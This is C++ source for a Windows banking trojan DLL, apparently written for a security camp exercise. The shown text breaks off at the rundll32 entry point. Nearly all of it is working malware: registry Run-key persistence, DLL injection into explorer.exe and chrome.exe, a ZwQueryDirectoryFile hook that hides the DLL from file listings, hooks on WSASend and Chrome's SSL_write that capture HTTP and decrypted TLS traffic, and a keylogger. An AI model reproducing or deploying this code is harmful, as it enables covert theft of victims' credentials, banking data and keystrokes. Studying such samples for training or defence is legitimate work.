/*
	BankingTrojan
	Author:Dinlon5566
	Email:  admin@dinlon5566.com
	Environment: VS19
	This project is for "TeamT5 Security Camp 2025 實作題目" only.
*/

#include "pch.h"
#include "Windows.h"
#include <iostream>
#include <set>

#include <tlhelp32.h>
#include <psapi.h>    // GetModuleBaseNameW function
#include <processthreadsapi.h>
#include <ws2tcpip.h> // For WinSock2
// For chrome (WinHttpSendRequest)
#include <winhttp.h>

// For Keylogger
#include <wchar.h>
#include <fstream>
#include <string>
#include <map>
#include <mutex>

// For MinHook
#include "types.h"
#include "include/MinHook.h"
#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

// Debug Message Box Print
#define DEBUG 0

const wchar_t dllName[] = L"BankingTrojan.dll";
const wchar_t targetProcessName[] = L"chrome.exe";
const std::string string_dllName = "BankingTrojan.dll";

// Function declaration
bool getDLLPath(wchar_t*);
DWORD WINAPI ExplorerMainThread(LPVOID);

/*
	Logger
*/


class Logger {
public:
	static Logger& getInstance() {
		static Logger instance;
		return instance;
	}

	bool initialize(const wchar_t* dllPath) {
		std::wstring path(dllPath);
		size_t pos = path.find_last_of(L"\\/");
		if (pos == std::wstring::npos) {
			return false; 
		}
		directory = path.substr(0, pos + 1);
		//MessageBoxW(NULL, directory.c_str(), L"initializeLogger", MB_OK);
		return true;
	}


	bool setLogFile(const std::wstring& logName) {
		std::lock_guard<std::mutex> lock(mtx);

		if (logFiles.find(logName) == logFiles.end()) {
			std::wstring fullPath = directory + logName;
			std::wofstream* ofs = new std::wofstream(fullPath, std::ios::app);
			if (!ofs->is_open()) {
				// open stream fail
				delete ofs;
				return false; 
			}
			logFiles[logName] = ofs;
		}
		return true;
	}


	void log(const std::wstring& logName, const std::wstring& message) {
		std::lock_guard<std::mutex> lock(mtx);
		auto it = logFiles.find(logName);
		if (it != logFiles.end()) {
			// flush without std::endl
			*(it->second) << message ;
			it->second->flush();
		}
	}

	void closeAll() {
		std::lock_guard<std::mutex> lock(mtx);
		for (auto& pair : logFiles) {
			if (pair.second->is_open()) {
				pair.second->close();
			}
			delete pair.second;
		}
		logFiles.clear();
	}

private:
	Logger() {}
	~Logger() { closeAll(); }

	Logger(const Logger&) = delete;
	Logger& operator=(const Logger&) = delete;

	std::wstring directory; // file directory
	std::map<std::wstring, std::wofstream*> logFiles;
	std::mutex mtx;
};

void initializeLogger() {
	wchar_t dllPath[MAX_PATH];
	if (getDLLPath(dllPath)) {
		if (!Logger::getInstance().initialize(dllPath)) {
			if(DEBUG)
				MessageBoxW(NULL, L"Fail to initialize Logger", L"initializeLogger", MB_OK);
		}
	}
	else {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"initializeLogger", MB_OK);
	}
}

// Set logger file 


void logBankingTrojanKeylogger(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"BankingTrojanKeylogger.txt");
	Logger::getInstance().log(L"BankingTrojanKeylogger.txt", message);
}

void logBankingTrojanChromeMitmHttp(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp.txt");
	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp.txt", message);
}

void logBankingTrojanChromeMitmHttp11OverTls(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp1.1OverTls.txt");
	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp1.1OverTls.txt", message);
}

void logBankingTrojanChromeMitmHttp20OverTls(const std::wstring& message) {
	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp2.0OverTls.txt");
	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp2.0OverTls.txt", message);
}

/*
	Common functions
*/

// Check if the current user is an administrator
bool isUserAdmin() {	// from MDMZ_Book.pdf
	bool isElevated = false;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	if (OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY, &token)) {
		if (GetTokenInformation(token, TokenElevation,
			&elev, sizeof(elev), &size)) {
			isElevated = elev.TokenIsElevated;
		}
	}
	if (token) {
		CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}


bool getDLLPath(wchar_t* DLLPath) {
	HMODULE hModule = NULL;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
	{
		if (GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
		{
			return true;
		}
	}
	return false;
}


// Do noting
void debug_hold() {
	while (true) {
		Sleep(1000);
	}
}


/*
	System functions
*/

bool writeRegedit(const wchar_t* dllPath) {
	// start command:
	// rundll32 "C:\dev\BankingTrojan\x64\Debug\BankingTrojan.dll", StartBankingTrojan
	// rundll32 BankingTrojan.dll, StartBankingTrojan
	const wchar_t* valueName = L"BankingTrojan";
	const wchar_t* regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//const wchar_t* regValue = L"C:\\Windows\\System32\\rundll32.exe \"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll\", StartBankingTrojan";
	std::wstring regLValue = L"C:\\Windows\\System32\\rundll32.exe \"" + std::wstring(dllPath) + L"\", StartBankingTrojan";
	const wchar_t* regValue = regLValue.c_str();


	HKEY hKey;
	LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);
	if (result != ERROR_SUCCESS)
	{
		return false;
	}

	result = RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(regValue), (wcslen(regValue) + 1) * sizeof(wchar_t));
	if (result != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return false;
	}

	RegCloseKey(hKey);
	return true;
}

bool IsProcessRunning(const wchar_t* processName, DWORD* PID = 0)
{
	bool exists = false;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(hSnapshot, &pe))
		{
			do
			{
				if (_wcsicmp(pe.szExeFile, processName) == 0)
				{
					exists = true;
					*PID = pe.th32ProcessID;
					break;
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return exists;
}

/*
	Loder functions
*/

bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//CloseHandle(hProcess); //  0
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

// hook without child process 
DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
{
	wchar_t dllPath[MAX_PATH];
	DWORD targetPID;
	const DWORD waitInterval = 1000;
	const wchar_t explorerProcessName[] = L"explorer.exe";
	std::set<DWORD> injectedPIDs;

	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
		return 0;
	}
	targetPID = 0;


	// scan and inject
	while (true) {
		if (IsProcessRunning(explorerProcessName, &targetPID)) {
			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
				// If pid not in set, inject to pid
				DLLinject(targetPID, dllPath);
				injectedPIDs.insert(targetPID); 
			}
		}
		Sleep(waitInterval); 
	}

	return 0;
}


// hook with child process 
DWORD WINAPI InjectChromeThread(LPVOID lpParam)
{
	wchar_t dllPath[MAX_PATH];
	DWORD targetPID;
	const DWORD waitInterval = 1000;
	const wchar_t chromeProcessName[] = L"chrome.exe";
	std::set<DWORD> injectedPIDs;

	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"ChromeMain", MB_OK);
		return 0;
	}
	std::set<DWORD> targetPIDs;

	auto getChromePIDs = [&chromeProcessName]() -> std::set<DWORD> {
		std::set<DWORD> chromePIDs;
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			return chromePIDs;
		}

		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnapshot, &pe32)) {
			do {
				if (wcscmp(pe32.szExeFile, chromeProcessName) == 0) {
					chromePIDs.insert(pe32.th32ProcessID);
				}
			} while (Process32Next(hSnapshot, &pe32));
		}

		CloseHandle(hSnapshot);
		return chromePIDs;
		};

	while (TRUE) {
		targetPIDs = getChromePIDs();
		for (DWORD targetPID : targetPIDs) {
			

			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
				// If pid not in set, inject to pid
				DLLinject(targetPID, dllPath);
				injectedPIDs.insert(targetPID);
				
			}
		}
		Sleep(waitInterval);
	}

	return 0;
}

bool TrojanLoader(const wchar_t* dllPath) {
	DWORD explorerThreadId = 0;
	DWORD chromeThreadId = 0;
	//----------------
	// crate InjectExplorerThread
	HANDLE hExplorerThread = CreateThread(
		NULL,
		0,
		InjectExplorerThread,
		NULL,
		0,
		&explorerThreadId
	);
	if (hExplorerThread == NULL) {
		if(DEBUG)
			MessageBoxW(NULL, L"Fail to create InjectExplorerThread", L"TrojanLoader", MB_OK);
	}
	// crate InjectChromeThread 
	HANDLE hChromeThread = CreateThread(
		NULL,
		0,
		InjectChromeThread,
		NULL,
		0,
		&chromeThreadId
	);
	if (hChromeThread == NULL) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to create InjectChromeThread", L"TrojanLoader", MB_OK);
	}

	return true;
}

/*
	Explorer functions
	Whem dll file injection to Explorer.exe, it will run this function.

	Debug API Hook was fail QQ
	https://github.com/Dinlon5566/IT_Reverse_Engineering/blob/main/Dx25/apiHooker.cpp

	MinHook
	https://github.com/zeze-zeze/2021iThome/blob/master/Explorer%E4%BD%A0%E6%80%8E%E9%BA%BC%E6%B2%92%E6%84%9F%E8%A6%BA/Rootkit/Rootkit/dllmain.cpp
*/

int cnt = 0;
typedef NTSTATUS(WINAPI* ZWQUERYDIRECTORYFILE)(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FileInformationClassEx FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
	);
ZWQUERYDIRECTORYFILE fpZwQueryDirectoryFile = NULL;



// 根據 FileInformationClass 回傳 FileInformation 的 FileName
WCHAR* GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->FileName;
	default:
		return NULL;
	}
}

// 根據 FileInformationClass 回傳 FileInformation 的 NextEntryOffset
ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileFullDirectoryInformation:
		return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileBothDirectoryInformation:
		return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
	case FileInformationClassEx::FileNamesInformation:
		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
	default:
		return 0;
	}
}

// 根據 FileInformationClass 設定 FileInformation 的 NextEntryOffset
void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
{
	switch (fileInformationClass)
	{
	case FileInformationClassEx::FileDirectoryInformation:
		((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileFullDirectoryInformation:
		((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdFullDirectoryInformation:
		((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileBothDirectoryInformation:
		((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileIdBothDirectoryInformation:
		((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	case FileInformationClassEx::FileNamesInformation:
		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
		break;
	}
}

// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "BankingTrojan" 字串的檔案 (code-from-zeze-itHome)
NTSTATUS DetourZwQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FileInformationClassEx FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
) {
	// 1. 呼叫原本的 ZwQueryDirectoryFile，取得檔案結構
	NTSTATUS status = fpZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	// 2. 確認是不是目標的 FileInformationClass
	if (NT_SUCCESS(status) && (FileInformationClass == FileInformationClassEx::FileDirectoryInformation || FileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileNamesInformation)) {
		PVOID pCurrent = FileInformation;
		PVOID pPrevious = NULL;
		do {
			// 3. 透過檔名判斷是不是要隱藏的檔案
			if (std::wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"BankingTrojan.dll") == 0) {
				// 4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry
				ULONG nextEntryOffset = GetFileNextEntryOffset(pCurrent, FileInformationClass);
				if (nextEntryOffset != 0) {
					int bytes = (DWORD)Length - ((ULONG)pCurrent - (ULONG)FileInformation) - nextEntryOffset;
					RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + nextEntryOffset), (DWORD)bytes);
				}
				// 如果已經是最後一個檔案了，就把上一個 Entry 的 NextEntryOffset 改成 0
				else {
					if (pCurrent == FileInformation)status = 0;
					else SetFileNextEntryOffset(pPrevious, FileInformationClass, 0);
					break;
				}
			}
			else {
				// 5. 不隱藏的檔案，就加上 NextEntryOffset 繼續判斷下一個檔案，直到 NextEntryOffset 等於 0 為止
				pPrevious = pCurrent;
				pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, FileInformationClass);
			}
		} while (GetFileNextEntryOffset(pPrevious, FileInformationClass) != 0);
	}
	return status;
}


bool explorerMain( ) {
	wchar_t DLLPath[MAX_PATH];
	if (!getDLLPath(DLLPath)) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
		return 0;
	}
	
	// 取得 ntdll.dll 的 handle
	HINSTANCE hDLL = LoadLibrary(L"ntdll.dll");
	if (!hDLL) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to LoadLibrary", L"ExplorerMain", MB_OK);
		return 1;
	}

	// 從 ntdll.dll 找到 ZeQueryDirectoryFile
	void* ZwQueryDirectoryFile = (void*)GetProcAddress(hDLL, "ZwQueryDirectoryFile");
	// show addr
	if (!ZwQueryDirectoryFile) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to GetProcAddress", L"ExplorerMain", MB_OK);
		return 1;
	}

	// 用 Hook 把 ZwQueryDirectoryFile 竄改成我們定義的 DetourZwQueryDirectoryFile
	if (MH_Initialize() != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
		return 1;
	}
	int status = MH_CreateHook(ZwQueryDirectoryFile, &DetourZwQueryDirectoryFile, reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile));
	if (status != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"ExplorerMain", MB_OK);
		return 1;
	}

	// 啟用 Hook
	status = MH_EnableHook(ZwQueryDirectoryFile);
	if (status != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"ExplorerMain", MB_OK);
		return 1;
	}

	//--------------
	//SetFileAttributesW(DLLPath, FILE_ATTRIBUTE_HIDDEN);

	
	if(DEBUG) 
		MessageBoxW(NULL, L"Success run to explorer.exe to END", L"ExplorerMain", MB_OK);
	

	return 1;
}

DWORD WINAPI ExplorerMainThread(LPVOID lpParam)
{
	explorerMain();
	return 0;
}


/*
	Chrome functions

	Whem dll file injection to chrome.exe, it will run this function.
*/

// For HTTP
// Hook WSASend

/*
int WSAAPI WSASend(
  [in]  SOCKET                             s,
  [in]  LPWSABUF                           lpBuffers,
  [in]  DWORD                              dwBufferCount,
  [out] LPDWORD                            lpNumberOfBytesSent,
  [in]  DWORD                              dwFlags,
  [in]  LPWSAOVERLAPPED                    lpOverlapped,
  [in]  LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
);
*/
typedef int (WSAAPI* WSASEND)(
	SOCKET s,
	LPWSABUF lpBuffers,
	DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesSent,
	DWORD dwFlags,
	LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
	);
WSASEND fpWSASend = NULL;

int WSAAPI DetourWSASend(
	SOCKET s,
	LPWSABUF lpBuffers,
	DWORD dwBufferCount,
	LPDWORD lpNumberOfBytesSent,
	DWORD dwFlags,
	LPWSAOVERLAPPED lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
) {
	std::string message = "\n";

	for (DWORD i = 0; i < dwBufferCount; ++i) {
		message += std::string(lpBuffers[i].buf, lpBuffers[i].len);
		message += "\r\n";
	}
	// if message contain http
	if (message.find("HTTP") != std::string::npos ) {
		if (DEBUG) {
			//MessageBoxA(NULL, message.c_str(), "DetourWSASend", MB_OK);
		}

		logBankingTrojanChromeMitmHttp(std::wstring(message.begin(), message.end()).c_str());
	}

	// Call the original WSASend function
	return fpWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
}

bool chromeHookWSASend() {
	// Load ws2_32.dll
	HINSTANCE hDLL = LoadLibrary(L"ws2_32.dll");
	if (!hDLL) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookWSASend", MB_OK);
		return 1;
	}

	// Get the address of WSASend
	void* ZwWSASend = (void*)GetProcAddress(hDLL, "WSASend");

	// Show the address
	if (!ZwWSASend) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to GetProcAddress", L"chromeHookWSASend", MB_OK);
		return 1;
	}

	/* MH_Initialize move to chromeMain().
	* 
	// Initialize MinHook
	if (MH_Initialize() != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_Initialize", L"chromeHookWSASend", MB_OK);
		return 1;
	}*/

	// Create a hook for WSASend
	int status = MH_CreateHook(ZwWSASend, &DetourWSASend, reinterpret_cast<LPVOID*>(&fpWSASend));
	if (status != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"chromeHookWSASend", MB_OK);
		return 1;
	}

	// Enable the hook
	status = MH_EnableHook(ZwWSASend);
	if (status != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"chromeHookWSASend", MB_OK);
		return 1;
	}

	return 1;
}


// For HTTPS 1.1 
typedef int(__fastcall* SSL_write_t)(void* ssl, const void* buf, int num);
SSL_write_t Original_SSL_write = nullptr;

int __fastcall DetourSSL_write(void* ssl, const void* buf, int num) {

	if (buf != nullptr && num > 0) {
		const char* data = static_cast<const char*>(buf);
		std::string buffer(data, num);
		// write to log
		logBankingTrojanChromeMitmHttp11OverTls(std::wstring(buffer.begin(), buffer.end()).c_str());
	}

	return Original_SSL_write(ssl, buf, num);
}



bool chromeHookSSL_write()
{
	HMODULE hDLL = GetModuleHandleW(L"chrome.dll");

	DWORD_PTR sslWriteOffset = 0x7B4D00; // 129.0.6668.71
	DWORD_PTR doPayloadWrite = 0x7B4A50; 

	BYTE* sslWriteAddress = reinterpret_cast<BYTE*>(hDLL) +sslWriteOffset;


	if (!hDLL) {
		if (DEBUG)
			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookDoPayloadWrite", MB_OK);
		return 0;
	}else
	{
		/*
		if (DEBUG) {
			// show address
			std::wstring message = L"chrome.dll address: ";
			message += std::to_wstring((DWORD)hDLL);
			MessageBoxA(NULL, std::string(message.begin(), message.end()).c_str(), "chromeHookDoPayloadWrite", MB_OK);
		
		}*/
	}

	/* MH_Initialize() move to chromeMain()
	* 
	// Initialize MinHook
	if (MH_Initialize() != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Failed to initialize MinHook.", L"chromeHookDoPayloadWrite", MB_OK);
		return 1;
	}*/

	if (MH_CreateHook(
		reinterpret_cast<LPVOID>(sslWriteAddress), // 要鉤取的函數地址
		&DetourSSL_write,                          // 鉤子函數地址
		reinterpret_cast<LPVOID*>(&Original_SSL_write) // 原始函數指針
	) != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Failed to create hook for SSL_write.", L"chromeHookDoPayloadWrite", MB_OK);
		return false;
	}

	if (MH_EnableHook(reinterpret_cast<LPVOID>(sslWriteAddress)) != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Failed to enable hook for SSL_write.", L"chromeHookDoPayloadWrite", MB_OK);
		return false;
	}

	return 1;
}



int chromeMain() {
	if (MH_Initialize() != MH_OK) {
		if (DEBUG)
			MessageBoxW(NULL, L"Failed to initialize MinHook.", L"chromeMain", MB_OK);
		return 1;
	}
	chromeHookWSASend();
	chromeHookSSL_write();

	return 1;
}

DWORD WINAPI ChromeMainThread(LPVOID lpParam)
{
	chromeMain();
	return 0;
}

/*
	Key logger functions
*/

// https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
std::map<int, std::wstring> initializeKeyMap() {
	std::map<int, std::wstring> keyMap = {
		{0x08, L"[BACKSPACE]"}, {0x09, L"[TAB]"}, {0x0C, L"[CLEAR]"}, {0x0D, L"[ENTER]\n"},
		{0x10, L"[SHIFT]"}, {0x11, L"[CTRL]"}, {0x12, L"[ALT]"}, {0x13, L"[PAUSE]"},
		{0x14, L"[CAPS LOCK]"}, {0x1B, L"[ESC]"}, {0x20, L"[SPACE]"}, {0x21, L"[PAGE UP]"},
		{0x22, L"[PAGE DOWN]"}, {0x23, L"[END]"}, {0x24, L"[HOME]"}, {0x25, L"[LEFT]"},
		{0x26, L"[UP]"}, {0x27, L"[RIGHT]"}, {0x28, L"[DOWN]"}, {0x2D, L"[INSERT]"},
		{0x2E, L"[DELETE]"},
		{0x30, L"0"}, {0x31, L"1"}, {0x32, L"2"}, {0x33, L"3"}, {0x34, L"4"},
		{0x35, L"5"}, {0x36, L"6"}, {0x37, L"7"}, {0x38, L"8"}, {0x39, L"9"},
		{0x41, L"A"}, {0x42, L"B"}, {0x43, L"C"}, {0x44, L"D"}, {0x45, L"E"},
		{0x46, L"F"}, {0x47, L"G"}, {0x48, L"H"}, {0x49, L"I"}, {0x4A, L"J"},
		{0x4B, L"K"}, {0x4C, L"L"}, {0x4D, L"M"}, {0x4E, L"N"}, {0x4F, L"O"},
		{0x50, L"P"}, {0x51, L"Q"}, {0x52, L"R"}, {0x53, L"S"}, {0x54, L"T"},
		{0x55, L"U"}, {0x56, L"V"}, {0x57, L"W"}, {0x58, L"X"}, {0x59, L"Y"},
		{0x5A, L"Z"},
		{0x60, L"[NUMPAD 0]"}, {0x61, L"[NUMPAD 1]"}, {0x62, L"[NUMPAD 2]"},
		{0x63, L"[NUMPAD 3]"}, {0x64, L"[NUMPAD 4]"}, {0x65, L"[NUMPAD 5]"},
		{0x66, L"[NUMPAD 6]"}, {0x67, L"[NUMPAD 7]"}, {0x68, L"[NUMPAD 8]"},
		{0x69, L"[NUMPAD 9]"}, {0x6A, L"[NUMPAD *]"}, {0x6B, L"[NUMPAD +]"},
		{0x6D, L"[NUMPAD -]"}, {0x6E, L"[NUMPAD .]"}, {0x6F, L"[NUMPAD /]"},
		{0x70, L"[F1]"}, {0x71, L"[F2]"}, {0x72, L"[F3]"}, {0x73, L"[F4]"},
		{0x74, L"[F5]"}, {0x75, L"[F6]"}, {0x76, L"[F7]"}, {0x77, L"[F8]"},
		{0x78, L"[F9]"}, {0x79, L"[F10]"}, {0x7A, L"[F11]"}, {0x7B, L"[F12]"},
		{0x7C, L"[F13]"}, {0x7D, L"[F14]"}, {0x7E, L"[F15]"}, {0x7F, L"[F16]"},
		{0xA0, L"[LEFT SHIFT]"}, {0xA1, L"[RIGHT SHIFT]"},
		{0xA2, L"[LEFT CTRL]"}, {0xA3, L"[RIGHT CTRL]"},
		{0xA4, L"[LEFT ALT]"}, {0xA5, L"[RIGHT ALT]"},
		{0x5B, L"[LEFT WIN]"}, {0x5C, L"[RIGHT WIN]"}, {0x5D, L"[APPS]"},
		{0xAD, L"[VOLUME MUTE]"}, {0xAE, L"[VOLUME DOWN]"}, {0xAF, L"[VOLUME UP]"},
		{0xB0, L"[NEXT TRACK]"}, {0xB1, L"[PREV TRACK]"}, {0xB2, L"[STOP TRACK]"},
		{0xB3, L"[PLAY/PAUSE]"}, {0xA6, L"[BROWSER BACK]"}, {0xA7, L"[BROWSER FORWARD]"},
		{0xA8, L"[BROWSER REFRESH]"}, {0xA9, L"[BROWSER STOP]"}, {0xAA, L"[BROWSER SEARCH]"},
		{0xAB, L"[BROWSER FAVORITES]"}, {0xAC, L"[BROWSER HOME]"}
	};
	return keyMap;
}

int keyLoggerMain() {
	auto keyMap = initializeKeyMap();

	logBankingTrojanKeylogger(L"\n-------------------KeyLoggerStart!-------------------\n");
	char key;

	while (true) {
		Sleep(10);
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (keyMap.find(key) != keyMap.end()) {

					// Convert uppercase to lowercase
					bool isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
					if (!isShiftPressed && key >= 'A' && key <= 'Z') {
						std::wstring s = keyMap[key].c_str();
						s[0] = tolower(s[0]);
						logBankingTrojanKeylogger(s.c_str());
						continue;
					}

					logBankingTrojanKeylogger(keyMap[key].c_str());
				}
				else {
					std::wstring ss = L"[VK_code : 0x";
					ss += std::to_wstring(key);
					ss += L"]";
					logBankingTrojanKeylogger(ss.c_str());
				}
			}
		}
	}

	return 1;
}

DWORD WINAPI KeyLoggerMainThread(LPVOID lpParam)
{
	keyLoggerMain();
	return 0;
}

/*
	RunDLL32 Entry point
*/
extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	wchar_t dllPath[MAX_PATH];

